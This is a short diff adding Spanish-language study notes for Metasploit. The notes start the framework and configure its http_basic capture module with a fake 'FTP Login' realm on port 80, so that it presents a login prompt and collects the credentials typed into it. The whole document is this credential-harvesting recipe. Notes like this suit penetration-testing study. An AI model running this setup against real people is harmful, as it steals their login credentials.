@@ -1,0 +1,12 @@
+Iniciamos metasploit
+  service postgresql start
+  msfdb init
+  msfconsole
+  
+use auxiliary/server/capture/http_basic
+
+set REALM FTP Login -> emula un servicio ftp
+set SRVPORT 80
+set URIPATH / -> directorio root
+
+run
